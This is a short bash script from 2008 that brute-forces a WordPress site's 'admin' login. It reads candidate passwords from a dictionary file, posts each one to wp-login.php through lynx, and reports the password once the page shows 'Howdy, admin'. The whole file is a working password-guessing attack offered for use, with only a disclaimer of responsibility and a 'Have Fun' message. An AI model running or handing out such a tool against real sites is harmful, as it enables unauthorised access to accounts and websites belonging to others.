#!/usr/bin/env bash
# wordpress BruteForce v1.0
# coded By 0x90 2008
# 0x90[at]bsdmail.org
#    I do not take any reponsibilty for what you do with this tool 
#    Hopefully it will make your life easier rather then making other 
#    peoples lives more difficult! 

echo ".::Wordpress BruteForce By 0x90::."
echo "use a good dictioary rename it to bf_passwords"
echo
echo -n "Enter website with full path to wordpress:
> "
 read site
 
n=`cat bf_passwords | wc -l`
for (( i=1; i <= $n; i++));
do
#default user is admin
password=`sed -n "$i"p bf_passwords`
b=`echo "log=admin&pwd="$password"&wp-submit=Log+In&redirect_to=wp-admin" | lynx -dump -nolist -post_data ""$site"/wp-login.php" | grep -o "Howdy, admin"`

echo trying password $password

if [ ! -z "$b" ]; then

echo "Bengo WebSite "$site" password is: "$password""
echo "Have Fun ;)"
exit 0
fi
done
echo
echo "brute force complete"
echo "no luck, try better dictionary"
exit
